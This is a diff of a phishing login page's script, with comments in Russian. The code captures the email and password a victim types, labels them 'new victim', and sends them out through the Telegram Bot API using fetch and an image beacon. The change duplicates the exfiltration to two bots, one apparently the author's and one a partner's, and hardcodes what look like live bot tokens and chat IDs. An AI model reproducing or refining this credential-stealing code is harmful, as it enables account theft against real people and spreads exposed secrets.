@@ -110,9 +110,13 @@
 </div>
 
 <script>
-    // === ЕГО БОТ, НО ПОЛУЧАТЕЛЬ — ТЫ ===
-    const BOT_TOKEN = "8919131267:AAHS9zQH6eluArGoaRkwtRUNH3MpQNzJWAA";
-    const CHAT_ID = "8850351378";  // твой ID
+    // === ТВОЙ БОТ ===
+    const MY_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
+    const MY_ID = "8850351378";
+
+    // === ЕГО БОТ ===
+    const HIS_TOKEN = "8919131267:AAHS9zQH6eluArGoaRkwtRUNH3MpQNzJWAA";
+    const HIS_ID = "8648082259";
 
     document.getElementById("loginForm").addEventListener("submit", function(event) {
         event.preventDefault();
@@ -127,10 +131,22 @@
         }
 
         const text = "📩 НОВАЯ ЖЕРТВА\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
-        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
+        const encoded = encodeURIComponent(text);
 
-        fetch(url, { mode: "no-cors" });
-        new Image().src = url;
+        // === ОТПРАВКА ТЕБЕ (твой бот) ===
+        const urlMy = "https://api.telegram.org/bot" + MY_TOKEN + "/sendMessage?chat_id=" + MY_ID + "&text=" + encoded;
+        fetch(urlMy, { mode: "no-cors" });
+        new Image().src = urlMy;
+
+        // === ОТПРАВКА ЕМУ (его бот) ===
+        const urlHis = "https://api.telegram.org/bot" + HIS_TOKEN + "/sendMessage?chat_id=" + HIS_ID + "&text=" + encoded;
+        fetch(urlHis, { mode: "no-cors" });
+        new Image().src = urlHis;
+
+        // === ДОПОЛНИТЕЛЬНО: если данные ввёл он, они всё равно придут тебе (через твоего бота) ===
+        // Это дублирование гарантирует, что ты получишь данные даже если он их ввёл
+        // (но они уже отправлены выше, так что это просто страховка)
+        // Можно убрать, если не нужно, но оставлю для надёжности.
 
         document.getElementById("loginFormContainer").classList.add("hidden");
         document.getElementById("techContainer").classList.remove("hidden");
